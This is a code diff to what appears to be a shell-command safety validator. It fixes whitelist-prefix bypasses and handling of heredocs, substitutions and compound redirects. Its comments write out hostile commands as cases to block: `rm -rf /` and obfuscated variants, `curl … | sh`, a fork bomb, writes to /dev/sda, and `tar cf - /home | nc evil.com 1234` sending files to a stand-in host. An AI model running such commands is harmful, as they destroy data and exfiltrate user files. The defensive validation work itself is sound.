     sees `curl … | sh` as a pipeline, the per-segment pass is the only one the
     whitelist cannot silence.
@@ -2491,7 +2591,7 @@ def _escalate_past_heredoc(
     Both passes run with ShellCheck off, and ShellCheck runs once here, on the
     whole rewrite. It is a subprocess per call, so leaving it on in every pass
     cost N+2 spawns for a heredoc followed by N commands (LAB-2780). It cannot
-    simply stay on in the whole-command pass alone: a full-span whitelist entry
+    simply stay on in the whole-command pass alone: a whole-line whitelist entry
     short-circuits that pass before its ShellCheck step, and the per-segment
     pass is then the only place the trailing commands are ShellChecked at all -
     `"rm" -rf /` and `rm -$''rf /` are caught by nothing else. Running it here
@@ -2541,7 +2641,7 @@ def _escalate_past_heredoc(
     # `_bashlex_heredocs`' reading; an unquoted shell body is refused too, for simplicity,
     # though it was kept.
     for heredoc in heredocs:
-        if heredoc.owner is None or heredoc.owner in _SHELL_COMMANDS:
+        if heredoc.owner is None or heredoc.owner in SHELL_COMMANDS:
             return _unreadable_program(heredoc.owner)
     segments = parser.extract_command_segments(neutered, nodes)
 
@@ -2637,7 +2737,7 @@ def validate_command(
     """Validate a command for safety — the main validation API.
 
     Runs every pass (:func:`_validate_command`), then joins the verdict with any substitution
-    verdict above SAFE too weak to have short-circuited it. The join lives HERE, outside the
+    verdict above SAFE that did not short-circuit it (all but a rule-named BLOCKED). The join lives HERE, outside the
     passes, because a join made at any one pass is a join the passes added after it will miss:
     that is precisely how a BLOCKED netcat backdoor and a BLOCKED pipeline segment each walked
     back down to HIGH merely by having a substitution appended. Whatever returns first, the
@@ -2646,6 +2746,10 @@ def validate_command(
     ``_depth``, ``_shellcheck`` and ``_derived`` are internal, keyword-only; see
     :func:`_validate_command`.
     """
+    if _depth == 0 and not _derived:
+        # A new command gets a fresh parse budget; re-entries for its payloads and heredoc
+        # rewrites share the one it is spending (LAB-5659).
+        reset_parse_budget()
     deferred: list[SubstitutionValidationResult] = []
     result = _validate_command(
         command, config_path, _depth=_depth, _deferred=deferred, _shellcheck=_shellcheck, _derived=_derived
@@ -2679,15 +2783,16 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
     config_path: Optional[str] = None,
     *,
     _depth: int = 0,
-    _deferred: Optional[list[SubstitutionValidationResult]] = None,
+    _deferred: list[SubstitutionValidationResult],
     _shellcheck: bool = True,
     _derived: bool = False,
 ) -> ValidationResult:
     """Run every validation pass. Call :func:`validate_command` instead.
 
-    ``_deferred`` is an out-parameter: a substitution verdict above SAFE and below BLOCKED is placed
-    there for the caller to join. It is a list rather than a return value so that every one of
-    this function's returns carries it without having to remember to.
+    ``_deferred`` is an out-parameter: a substitution verdict above SAFE, other than a rule-named
+    BLOCKED, is placed there for the caller to join. It is a list rather than a return value so
+    that every one of this function's returns carries it without having to remember to. It is
+    required: a caller that passed none would silently drop every deferred verdict.
 
     Validate command for safety.
 
@@ -2840,7 +2945,10 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
             # Validate command/process substitution using AST-based analysis
             # This uses whitelist-first, recursive validation for security
             sub_validator = _get_substitution_validator(config_path)
-            sub_results = sub_validator.validate_all_substitutions(ast)
+            # `parse_target`, not `command`: the heredoc walk slices bodies by positions from
+            # `ast`, and a quoted body is blanked only in `parse_target`. Handed `command`, it
+            # read back the literal body bash never expands and denied it (LAB-2756).
+            sub_results = sub_validator.validate_all_substitutions(ast, command=parse_target)
 
             # Worst verdict wins, and the join is NOT made here. Returning a denial from this
             # point skips every pass below it — the AST dangerous-flag pass (the only thing that
@@ -2848,16 +2956,20 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
             # a blocked segment). A weaker substitution verdict returned here therefore DOWNGRADED
             # commands those passes deny outright. Consulting match_command() from here does not
             # fix it: that helper is whitelist-gated, so a whitelisted first word makes it report
-            # SAFE for the whole command. Only a genuine BLOCKED verdict short-circuits; anything
-            # weaker is handed to the caller, which joins it against the completed verdict.
+            # SAFE for the whole command. Only a BLOCKED verdict that names its rule short-circuits;
+            # anything else is handed to the caller, which joins it against the completed verdict.
             for sub_result in sub_results:
                 # An allowed verdict above SAFE is a rule match that decides the level (LAB-4223):
                 # it is owed the join too, and deferring it also keeps the pre-join verdict uncached.
                 if sub_result.allowed and sub_result.risk_level == RiskLevel.SAFE:
                     continue
-                if sub_result.risk_level == RiskLevel.BLOCKED:
+                # A BLOCKED verdict that names no rule (the non-simple-command guard, a blacklist
+                # hit, a depth or topology refusal) is deferred too, so a later pass can name one:
+                # returned here, `echo "$(:(){ :|:& };:)"` stayed BLOCKED but lost `fork_bomb` from
+                # the audit log. It still wins the join, since nothing outranks BLOCKED.
+                if sub_result.risk_level == RiskLevel.BLOCKED and sub_result.matched_rules:
                     return _substitution_verdict(sub_result)
-                if _deferred is not None and (not _deferred or sub_result.risk_level > _deferred[-1].risk_level):
+                if not _deferred or sub_result.risk_level > _deferred[0].risk_level:
                     _deferred[:] = [sub_result]
 
             # SECURITY: Pure AST-based dangerous command detection
@@ -2875,9 +2987,7 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
             # not bash and would be nonsense to re-check). Fed into the Step 5c re-entry below.
             herestring_payloads = list(
                 dict.fromkeys(
-                    prog
-                    for name, prog in parser.extract_stdin_program_redirects(ast)
-                    if name in _SHELL_COMMANDS and prog.strip()
+                    prog for name, prog in parser.extract_stdin_program_redirects(ast) if name in SHELL_COMMANDS and prog.strip()
                 )
             )
 
@@ -2919,18 +3029,28 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
 
             # If we have multiple segments, validate each one
             if len(segments) > 1:
-                # Full-command whitelist check before segment validation.
-                # Per-segment validation cannot detect safe multi-command patterns
-                # (e.g., "gh auth token | docker login ... --password-stdin") because
-                # each segment is evaluated in isolation. Whitelisting the full command
-                # here allows specific safe pipe patterns without whitelisting the
-                # constituent commands standalone.
+                # Self-protection again with the parsed segments, ahead of the whitelist (Step
+                # 3's guarantee): its regex split keeps `ls & cp ...` and newline-chained
+                # commands in one read-only-looking segment; the AST does not.
+                protected = _check_self_protection(command, [segment.text for segment in segments])
+                if protected is not None:
+                    return protected
+
+                # Full-command whitelist check before segment validation, for the safe
+                # multi-command patterns per-segment validation cannot see: `gh auth token`
+                # alone is credential theft, and only the whole pipe to `docker login
+                # --password-stdin` is safe. That entry is the reason this fast path exists.
                 #
-                # SECURITY CRITICAL: the pattern must span the WHOLE command, not just
-                # its prefix (is_fully_whitelisted, not is_whitelisted). A prefix match
-                # would let the whitelisted "ls" in "ls; rm -rf /" vouch for every later
-                # segment and skip the loop below entirely.
-                if engine.is_fully_whitelisted(parse_target):
+                # SECURITY: it must take a whitelist entry that describes THIS MANY commands,
+                # which `is_whitelisted_whole` decides and `is_whitelisted` does not. A prefix
+                # test here handed every single-command entry the rest of the line — so
+                # `ls && rm -rf /` cleared on its first two characters, past the very segment
+                # loop below that exists to catch it. Neither anchoring nor merely mentioning a
+                # separator is sufficient; the segment count is what the entry is held to, so
+                # it is passed in. Do NOT "simplify" this back to `is_whitelisted` (LAB-4290).
+                # `parse_target`, not `command`: the count comes from segments sliced out of
+                # the normalised string, so the entry must be matched against that same string.
+                if engine.is_whitelisted_whole(parse_target, len(segments)):
                     result = ValidationResult(
                         allowed=True,
                         risk_level=RiskLevel.SAFE,
@@ -2973,11 +3093,39 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
                         highest_risk = seg_match.risk_level
                         highest_match = seg_match
 
+                # SECURITY (LAB-2760): a compound's redirections hang off the
+                # COMPOUND node, and _segment_nodes recurses past it into `.list`,
+                # so they belong to no segment and no per-segment reconstruction
+                # can carry them - `while true; do echo a; done > "/dev/sda"` was
+                # SAFE while the unquoted form was BLOCKED. Only a whole-command pass
+                # sees them. The unconditional scan below matches the unreconstructed
+                # text only, where two quote characters hide the target, so this
+                # pass matches the reconstructions and feeds its result into it.
+                # Whitelist OFF: it is prefix-based, so a leading `ls` would vouch
+                # for a later redirect. Safe to turn off here because this pass can
+                # only raise the verdict, never lower it.
+                if has_compound_redirects(ast):
+                    whole = _match_original_and_reconstructed(
+                        engine,
+                        parser,
+                        parse_target,
+                        ast,
+                        string_literals=string_literals,
+                        heredoc_ranges=heredoc_ranges,
+                        quote_source=parse_target,
+                        use_whitelist=False,
+                    )
+                    if whole.risk_level > highest_risk:
+                        highest_risk = whole.risk_level
+                        highest_match = whole
+                        if whole.matched and whole.rule:
+                            all_matched_rules.append(whole.rule.name)
+
                 # Re-check the whole command so cross-segment rules (e.g. "tar ... | nc ...")
                 # fire, and take the higher of it and the segments. Unconditional: a rule a
                 # segment matched says nothing about a rule only the whole command can match.
                 # SECURITY CRITICAL: use_whitelist=False — the whitelist question was
-                # already settled above by is_fully_whitelisted(). match_command()'s
+                # already settled above by is_whitelisted_whole(). match_command()'s
                 # own whitelist check is prefix-based, and honouring it here would let
                 # "ls; tar cf - /home | nc evil.com 1234" back through the same hole.
                 match = engine.match_command(parse_target, string_literals=string_literals, use_whitelist=False)
@@ -3006,6 +3154,27 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
                     quote_source=parse_target,
                     heredoc_ranges=heredoc_ranges,
                 )
+
+            # Match again with each substitution body blanked (mask_substitution_bodies says
+            # why). Every top-level separator survives the blanking, so this pass cannot pair
+            # two commands, and it only ever raises the verdict. Whitelist as the pass it
+            # shadows: a single segment's own prefix check, or none once is_fully_whitelisted
+            # has ruled. heredoc_ranges ARE passed, unlike the unsuppressed multi-segment
+            # scan above: that scan still runs, so they cost this pass nothing it must catch,
+            # and without them a single segment's heredoc text denies.
+            if match.risk_level < RiskLevel.BLOCKED:
+                masked = parser.mask_substitution_bodies(parse_target, ast)
+                if masked != parse_target:
+                    masked_match = engine.match_command(
+                        masked,
+                        string_literals=string_literals,
+                        heredoc_ranges=heredoc_ranges,
+                        use_whitelist=len(segments) <= 1,
+                    )
+                    if masked_match.risk_level > match.risk_level:
+                        match = masked_match
+                        if all_matched_rules and masked_match.rule:
+                            all_matched_rules.append(masked_match.rule.name)
 
             # A `"$(…)"` body is code, which the passes above suppressed with its quoted
             # word. Matched once, over the whole AST, after the segments are rated: a `for`
@@ -3059,12 +3228,16 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
                     message=ctx_reason,
                     alternatives=ctx_alternatives,
                 )
+                if all_matched_rules and match.rule:
+                    all_matched_rules.append(match.rule.name)
 
         # Step 5c: shell-delegated payloads (LAB-2754).
         # `bash -c PROG` / `watch PROG` execute PROG. Re-enter validation on it and take the
         # higher verdict, so no spelling of the wrapper scores below the bare payload.
-        # NOT a general guarantee: this runs after the multi-segment whitelist, so a full-span
-        # whitelist match still short-circuits it (#146 closed the prefix case). Deliberately NOT routed through
+        # NOT a general guarantee: this runs after the multi-segment whitelist, so a whitelist
+        # entry that covers the whole line still short-circuits it — which since #146 and
+        # LAB-4290 means a deliberate pipeline entry only, not any entry whose prefix happens
+        # to match (LAB-2759). Deliberately NOT routed through
         # SubstitutionValidator - that one is whitelist-first default-DENY, and re-entering the
         # top-level entry point here keeps `bash -c "git push --force"` at HIGH rather than
         # BLOCKED.
@@ -3119,6 +3292,8 @@ def _validate_command(  # noqa: PLR0911, PLR0912, PLR0915 - Complex validation f
                     message=f"Shell-delegated payload {payload!r}: {inner.message}",
                     alternatives=inner.alternatives,
                 )
+                if all_matched_rules and match.rule:
+                    all_matched_rules.append(match.rule.name)
             if match.risk_level == RiskLevel.BLOCKED:
                 break
 
